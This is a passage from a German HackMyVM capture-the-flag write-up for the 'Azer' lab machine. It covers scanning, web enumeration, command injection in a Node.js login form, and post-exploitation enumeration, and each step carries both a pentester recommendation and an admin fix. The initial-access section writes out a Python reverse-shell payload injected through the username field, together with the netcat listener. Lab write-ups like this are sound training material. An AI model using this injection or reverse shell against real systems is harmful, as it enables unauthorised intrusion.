@@ -1,0 +1,714 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azer - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Azer - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-scanning">Port Scanning</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Command Injection)</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept (Initial Access - Command Injection)</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation Enumeration (as azer)</a></li>
+                <li><a href="#privilege-escalation-enum">Privilege Escalation Enumeration</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Password Guessing via Internal Service)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - Password Guessing)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt ist ein ARP-Scan im lokalen Netzwerk (`-l`), um aktive Hosts zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet erfolgreich das Zielsystem unter der IP `192.168.2.114`. Die MAC-Adresse `08:00:27:46:00:f3` gehört zu "PCS Systemtechnik GmbH", was auf eine Oracle VirtualBox VM hinweist. Ein Standard-Startpunkt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die IP `192.168.2.114` für weitere Scans. Notiere die VM-Information als Kontext.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit durch ARP-Scans reduzieren. Überwachen Sie auf ungewöhnliche ARP-Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span>
+                    </div>
+                    <pre>
+192.168.2.114	08:00:27:46:00:f3	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet (`vi`), um der IP-Adresse `192.168.2.114` den Hostnamen `azer.hmv` zuzuordnen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine essenzielle Vorbereitung, um Webserver, die möglicherweise mit Virtual Hosts konfiguriert sind, korrekt ansprechen zu können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende `azer.hmv` in allen nachfolgenden Web-Interaktionen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sorgen Sie für eine sichere und zuverlässige Namensauflösung im Netzwerk.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi /etc/hosts</span>
+                     </div>
+                     <pre>
+# Inhalt der /etc/hosts nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.114   azer.hmv
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="port-scanning">
+            <h2>Port Scanning</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap TCP SYN Scan (`-sS`) mit Versionserkennung (`-sV`), OS-Erkennung (`-O`) und schnellem Timing (`-T5`) wird über alle Ports (`-p-`) ausgeführt. Die Ausgabe wird gefiltert (`grep open`), um nur offene Ports anzuzeigen. Die Option `-A` wird nicht verwendet, aber `-O` ist Teil davon.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert zwei offene TCP-Ports, die die Hauptangriffsfläche bilden:
+                *   `80/tcp`: Apache httpd 2.4.57 (Debian). Ein Standard-Webserver.
+                *   `3000/tcp`: Node.js (Express middleware). Ein weiterer Webserver, oft für APIs oder spezifische Webanwendungen verwendet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche beide Webdienste. Beginne mit Port 80 (Apache) für grundlegende Enumeration, aber konzentriere dich dann auf Port 3000 (Node.js), da dies oft auf eine benutzerdefinierte Anwendung hindeutet.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sowohl der Apache- als auch der Node.js-Dienst aktuell gepatcht und sicher konfiguriert sind. Firewall: Nur benötigte Ports öffnen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.114 -p- | grep open</span> <!-- Hinweis: -AO ist wie -A -->
+                     </div>
+                     <pre>
+ 80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+ 3000/tcp open  http    Node.js (Express middleware)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Nmap-Scan wird mit denselben Optionen wiederholt, diesmal jedoch mit vollständiger Ausgabe.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die vollständige Ausgabe bestätigt die Dienste und liefert zusätzliche Details:
+                 *   **Port 80 (Apache):** Seitentitel "LÖSEV | Lösemili Çocuklar Vakfı" (eine türkische Stiftung für Kinder mit Leukämie). Dies wirkt deplatziert und könnte ein Hinweis auf eine Defacement, eine Fehlkonfiguration oder eine absichtliche Irreführung sein.
+                 *   **Port 3000 (Node.js):** Seitentitel "Login Page". Dies ist eindeutig ein Login-Portal und damit ein primäres Ziel.
+                 *   **OS:** Wird als Debian Linux erkannt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fokussiere dich stark auf die Login-Seite auf Port 3000. Untersuche die LÖSEV-Seite auf Port 80 kurz auf versteckte Hinweise oder Verzeichnisse, aber erwarte hier keine Kernfunktionalität.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Klären Sie den Zweck der Webseite auf Port 80. Wenn sie nicht beabsichtigt ist, entfernen Sie sie. Sichern Sie die Node.js-Anwendung auf Port 3000 (Authentifizierung, Input-Validierung etc.).
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.114 -p-</span>
+                      </div>
+                      <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 23:08 CEST
+ Nmap scan report for azer.hmv (192.168.2.114)
+ Host is up (0.00018s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PORT     STATE SERVICE VERSION
+ 80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+ |_http-title: LÖSEV | Lösemili Çocuklar Vakf\xC4\xB1
+ |_http-server-header: Apache/2.4.57 (Debian)
+ 3000/tcp open  http    Node.js (Express middleware)
+ |_http-title: Login Page
+ MAC Address: 08:00:27:46:00:F3 (Oracle VirtualBox virtual NIC)
+ Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (94%), Linux 5.0 - 5.4 (92%), Linux 2.6.32 (91%), Linux 3.2 - 4.9 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.3 - 5.4 (90%), Linux 5.4 (90%), Linux 3.4 - 3.10 (89%), Linux 3.3 (88%)
+ No exact OS matches for host (test conditions non-ideal).
+ Network Distance: 1 hop
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ TRACEROUTE
+ HOP RTT     ADDRESS
+ 1   0.18 ms azer.hmv (192.168.2.114)
+
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
+                      </pre>
+                  </div>
+              </div>
+         </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> `nikto` wird auf den Apache-Server (Port 80) ausgeführt, um nach bekannten Schwachstellen und Konfigurationsfehlern zu suchen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Nikto bestätigt Apache 2.4.57 (Debian) und meldet die üblichen Findings:
+                 *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+                 *   Mögliches Informationsleck durch ETag-Format.
+                 *   Erlaubte HTTP-Methoden (POST, OPTIONS, HEAD, GET).
+                 Keine kritischen Schwachstellen auf Port 80 identifiziert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Dokumentiere die Findings für Port 80, aber konzentriere die Bemühungen auf Port 3000.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Aktualisieren Sie Apache. Konfigurieren Sie ETags sicher.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">nikto -h http://192.168.2.114</span>
+                      </div>
+                      <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.114
+ + Target Hostname:    192.168.2.114
+ + Target Port:        80
+ + Start Time:         2024-04-30 23:08:50 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.57 (Debian)
+ + /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
+ + /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + No CGI Directories found (use '-C all' to force check all possible dirs)
+ + /: Server may leak inodes via ETags, header found with file /, inode: 9e9b, size: 611db26291300, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ + OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ + 8103 requests: 0 error(s) and 4 item(s) reported on remote host
+ + End Time:           2024-04-30 23:09:06 (GMT2) (16 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `gobuster` wird für einen Verzeichnis- und Dateiscan auf Port 80 verwendet, mit einer Medium-Wortliste und vielen Endungen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Scan findet `/index.html` (die LÖSEV-Seite) und zwei Verzeichnisse: `/v6/` und `/ik/`. Diese gehören wahrscheinlich zur LÖSEV-Webseite.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuche kurz `/v6/` und `/ik/` auf Hinweise, aber erwarte hier keine Schwachstellen für den Haupteinstieg.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Verzeichnisse und Dateien vom Webserver.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">gobuster dir -u http://azer.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                      </div>
+                      <pre>
+ ==============================================================================================================================
+ http://azer.hmv/index.html           (Status: 200) [Size: 40603]
+ http://azer.hmv/v6                   (Status: 301) [Size: 301] [--> http://azer.hmv/v6/]
+ http://azer.hmv/ik                   (Status: 301) [Size: 301] [--> http://azer.hmv/ik/]
+ ==============================================================================================================================
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Quellcode von `/v6/bagis.html` (vermutlich innerhalb des `/v6`-Verzeichnisses gefunden) wird inspiziert.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Code enthält Kommentare von `HTTrack Website Copier`. Dies bestätigt, dass der Inhalt auf Port 80 wahrscheinlich nur eine statische Kopie einer anderen Webseite ist und nicht die eigentliche Anwendung darstellt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Ignoriere Port 80 weitgehend und konzentriere dich voll auf Port 3000.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Entfernen Sie gecrawlte Webseiten vom Server, wenn sie nicht benötigt werden.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+ view-source:http://azer.hmv/v6/bagis.html <!-- Pfad angenommen -->
+ <!-- Mirrored from www.losev.org.tr/v6/bagis by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 Feb 2024 05:33:54 GMT -->
+ <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+                      </pre> <!-- Maskierung < > & -->
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Quellcode der Login-Seite auf Port 3000 (`http://azer.hmv:3000`) wird angezeigt.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Es handelt sich um ein Standard-HTML-Login-Formular, das die eingegebenen Daten per POST an `/login` sendet. Die Felder heißen `username` und `password`. Keine clientseitige Validierung sichtbar.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Teste dieses Formular auf Command Injection (wie bereits erfolgreich durchgeführt), SQL-Injection, Default Credentials und andere Web-Schwachstellen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Sichern Sie das Backend (`/login`), das diese Formulardaten verarbeitet, gegen alle gängigen Web-Angriffe.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+ # Quellcode von http://azer.hmv:3000
+ <html>
+ <head><title>Login Page</title></head>
+ <body>
+   <h2>Login</h2>
+   <form action="/login" method="post">
+     <div>
+       <label for="username">Username:</label>
+       <input type="text" id="username" name="username">
+     </div>
+     <div>
+       <label for="password">Password:</label>
+       <input type="password" id="password" name="password">
+     </div>
+     <button type="submit">Login</button>
+   </form>
+ </body>
+ </html>
+                      </pre> <!-- Maskierung < > -->
+                  </div>
+              </div>
+         </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Command Injection)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Eine Fehlermeldung, die vermutlich bei einem fehlgeschlagenen Login-Versuch auf Port 3000 aufgetreten ist, wird analysiert. Sie lautet: "Error executing bash script: Command failed: /home/azer/get.sh admin admin fatal: not a git repository...". Es wird versucht, auf `/.git` zuzugreifen, was fehlschlägt.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Diese Fehlermeldung ist **extrem aufschlussreich**. Sie verrät:
+                 1.  Ein Skript `/home/azer/get.sh` wird im Backend ausgeführt.
+                 2.  Die Eingaben aus dem Login-Formular (hier "admin" und "admin") werden als Argumente an dieses Skript übergeben.
+                 3.  Das Skript führt `git`-Befehle aus.
+                 4.  Der Benutzer `azer` existiert.
+                 Dies schreit förmlich nach einer **Command Injection**-Schwachstelle, da Benutzereingaben offenbar direkt oder unsicher an ein Shell-Skript weitergegeben werden. Der fehlgeschlagene Zugriff auf `/.git` ist hier weniger relevant.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutze die Command Injection! Injiziere Shell-Metacharacters (`;`, `|`, `$()`, `` ` ``) und Befehle in das `username`- oder `password`-Feld des Login-Formulars auf Port 3000, um eigene Befehle auszuführen. Ziel ist eine Reverse Shell.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Beheben Sie diese kritische Command Injection sofort!** Übergeben Sie niemals Benutzereingaben direkt an Shell-Befehle. Verwenden Sie stattdessen sichere APIs oder validieren und sanitisieren Sie die Eingaben rigoros, um Metacharacter zu neutralisieren. Überprüfen Sie den Code von `server.js` (Node.js) und `/home/azer/get.sh`. Geben Sie keine detaillierten Fehlermeldungen an den Benutzer aus.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+ # Beobachtete Fehlermeldung (vermutlich von Port 3000)
+ Error executing bash script: Command failed: /home/azer/get.sh admin admin fatal: not a git repository (or any of the parent directories): .git
+
+ # Versuchter Zugriff auf /.git (basierend auf Fehler)
+ http://azer.hmv:3000/.git
+ --> Cannot GET /.git
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die Command Injection-Schwachstelle wird ausgenutzt. Ein Python-Reverse-Shell-Payload wird in das `Username`-Feld des Login-Formulars auf Port 3000 eingefügt. Das Semikolon `;` am Anfang dient dazu, den ursprünglichen Befehl im Backend-Skript abzuschließen, bevor der Python-Payload ausgeführt wird. Auf dem Angreifer-System wird ein Netcat-Listener auf Port 5555 gestartet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **Initial Access erfolgreich!** Der Exploit funktioniert. Der Listener auf Port 5555 empfängt eine Verbindung vom Zielsystem, und eine interaktive Shell als Benutzer `azer` wird erlangt. Der `id`-Befehl bestätigt die Benutzeridentität (uid=1000).
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell (z.B. mit Python PTY). Beginne mit der Enumeration des Systems als Benutzer `azer`. Lese die User-Flag (`user.txt`). Suche nach Wegen zur Privilege Escalation.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Command Injection sofort beheben!** (Siehe vorherige Empfehlung). Untersuchen Sie die Logs auf Anzeichen des Angriffs. Überprüfen Sie das System auf Kompromittierung.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+ # Payload für das Username-Feld auf http://azer.hmv:3000/
+ Username: ;python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",5555));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+ Password: [beliebig]
+                      </pre> <!-- Maskierung ' " ( ) ; -->
+                  </div>
+              </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 5555</span>
+                     </div>
+                     <pre>
+ listening on [any] 5555 ...
+ connect to [192.168.2.199] from (UNKNOWN) [192.168.2.114] 60286
+ /bin/sh: 0: can't access tty; job control turned off
+ $ <span class="command">id</span>
+ uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)
+ $ <span class="command">ls</span>
+ get.sh
+ node_modules
+ package.json
+ package-lock.json
+ server.js
+ user.txt
+ $ <span class="command">cat user.txt</span>
+ <span class="password">0d2856d69dc348b3af80a0eed67c7502</span>
+ $
+                     </pre>
+                 </div>
+             </div>
+         </section>
+
+        <section id="poc-initial-access">
+             <h2>Proof of Concept (Initial Access - Command Injection)</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Dieser POC fasst die Schritte zur Erlangung einer Shell als Benutzer `azer` durch Ausnutzung einer Command Injection-Schwachstelle im Login-Formular der Node.js-Anwendung auf Port 3000 zusammen.
+              </p>
+              <p>
+                  <strong>Schwachstelle:</strong> Die Benutzereingabe aus dem Login-Formular (wahrscheinlich das Username-Feld) wird unsicher an ein Shell-Skript (`/home/azer/get.sh`) übergeben, was die Injektion von beliebigen Shell-Befehlen mittels Metacharacters (hier `;`) ermöglicht.
+              </p>
+              <p>
+                  <strong>Voraussetzungen:</strong> Zugriff auf das Login-Formular unter `http://azer.hmv:3000`. Ein Listener auf dem Angreifer-System.
+              </p>
+              <p>
+                  <strong>Schritte zur Reproduktion:</strong>
+                  <ol>
+                      <li>Starte einen Netcat-Listener auf dem Angreifer-System: `nc -lvnp 5555`.</li>
+                      <li>Öffne die Login-Seite `http://azer.hmv:3000` im Browser oder verwende `curl`.</li>
+                      <li>Gib im Username-Feld den folgenden Payload ein (ersetze `[IP_Angreifer]` durch die IP des Angreifer-Systems):<br> `;python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP_Angreifer]",5555));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`</li>
+                      <li>Gib ein beliebiges Passwort ein.</li>
+                      <li>Sende das Formular ab.</li>
+                  </ol>
+              </p>
+              <p>
+                  <strong>Erwartetes Ergebnis:</strong> Eine Reverse Shell verbindet sich vom Zielsystem zum Netcat-Listener des Angreifers und gewährt eine Shell als Benutzer `azer`.
+              </p>
+               <p class="recommendation">
+                  <strong>Empfehlung (Admin):</strong> **Command Injection-Schwachstelle beheben!** Überprüfen Sie den Code von `server.js` und `get.sh`. Verwenden Sie niemals direkte Benutzereingaben in Shell-Befehlen. Nutzen Sie stattdessen sichere Methoden zur Interaktion mit anderen Prozessen oder sanitisieren/validieren Sie Eingaben rigoros.
+              </p>
+          </section>
+
+        <section id="post-exploitation">
+             <h2>Post-Exploitation Enumeration (as azer)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Als Benutzer `azer` wird eine grundlegende Systemenumeration durchgeführt: SUID-Dateien (`find`), Netzwerk-Listener (`ss`), `/etc/passwd`-Berechtigungen, `sudo`-Check, Capabilities (`getcap`), Crontab (`cat /etc/crontab`) und Netzwerkschnittstellen (`ip a`).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   **SUID/Capabilities/sudo/Crontab:** Keine offensichtlichen oder leicht ausnutzbaren Vektoren für Privilege Escalation gefunden. `sudo` ist nicht installiert/verfügbar.
+                 *   **Netzwerk:** Bestätigt Listener auf 80 und 3000. **Wichtigster Fund:** Die Existenz von Docker-Netzwerkschnittstellen (`br-333...`, `docker0`, `veth...`) mit dem internen Netzwerk `10.10.10.0/24`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Das Docker-Netzwerk `10.10.10.0/24` ist der vielversprechendste nächste Schritt. Versuche, Dienste innerhalb dieses Netzwerks vom `azer`-Host aus zu scannen oder direkt zu kontaktieren (z.B. `curl`, `nc`). Suche nach der IP des Containers (oft nicht die Gateway-IP `.1`).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Docker-Konfiguration. Sichern Sie die Kommunikation zwischen Host und Containern sowie zwischen Containern. Führen Sie Container mit minimalen Rechten aus. Überwachen Sie Docker-Netzwerke.
+             </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ azer@azer:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                       </div>
+                       <pre>
+    277097     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    285836    640 -rwsr-xr-x   1 root     root         653888 Dec 19 09:51 /usr/lib/openssh/ssh-keysign
+    406202     20 -rwsr-xr-x   1 root     root          18664 Jan 31  2023 /usr/lib/polkit-1/polkit-agent-helper-1
+    264246     36 -rwsr-xr-x   1 root     root          35128 Mar 23  2023 /usr/bin/umount
+    290341     36 -rwsr-xr-x   1 root     root          35128 Apr 18  2023 /usr/bin/fusermount3
+    260733     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
+    264244     60 -rwsr-xr-x   1 root     root          59704 Mar 23  2023 /usr/bin/mount
+    264762     72 -rwsr-xr-x   1 root     root          72000 Mar 23  2023 /usr/bin/su
+    260736     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
+    260737     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
+    264091     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
+    260734     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:/var/www/html$ <span class="command">ss -atlpn</span>
+                      </div>
+                      <pre>
+ State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port Process
+ LISTEN 0      511                  *:3000              *:*     users:(("node",pid=493,fd=18))
+ LISTEN 0      511                  *:80                *:*
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:/opt/containerd$ <span class="command">ls -la /etc/passwd</span>
+                      </div>
+                      <pre>
+ -rw-r--r-- 1 root root 1185 Feb 21 07:24 /etc/passwd
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:/opt/containerd$ <span class="command">sudo -l</span>
+                      </div>
+                      <pre>
+ bash: sudo: command not found
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:/opt/containerd$ <span class="command">getcap -r / 2>/dev/null</span>
+                      </div>
+                      <pre>
+ /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+ /usr/bin/ping cap_net_raw=ep
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:/opt/containerd$ <span class="command">cat /etc/crontab</span>
+                      </div>
+                      <pre>
+ SHELL=/bin/sh
+ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+ # Example of job definition:
+ # .---------------- minute (0 - 59)
+ # |  .------------- hour (0 - 23)
+ # |  |  .---------- day of month (1 - 31)
+ # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+ # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+ # |  |  |  |  |
+ # *  *  *  *  * user-name command to be executed
+ 17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+ 25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+ 47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+ 52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+ #
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt" style="color: yellow;">
+ azer@azer:~/.npm$ <span class="command">ip a</span>
+                      </div>
+                      <pre>
+ 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+     inet 127.0.0.1/8 scope host lo
+        valid_lft forever preferred_lft forever
+     inet6 ::1/128 scope host noprefixroute
+        valid_lft forever preferred_lft forever
+ 2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+     link/ether 08:00:27:46:00:f3 brd ff:ff:ff:ff:ff:ff
+     inet 192.168.2.114/24 brd 192.168.2.255 scope global dynamic enp0s3
+        valid_lft 1812344sec preferred_lft 1812344sec
+     inet6 2003:d4:c73e:eb48:a00:27ff:fe46:f3/64 scope global dynamic mngtmpaddr
+        valid_lft 604796sec preferred_lft 86396sec
+     inet6 fe80::a00:27ff:fe46:f3/64 scope link
+        valid_lft forever preferred_lft forever
+ 3: br-333bcb432cd5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+     link/ether 02:42:25:6f:87:4d brd ff:ff:ff:ff:ff:ff
+     inet <span style="color:orange;">10.10.10.1/24</span> brd 10.10.10.255 scope global br-333bcb432cd5
+        valid_lft forever preferred_lft forever
+     inet6 fe80::42:25ff:fe6f:874d/64 scope link
+        valid_lft forever preferred_lft forever
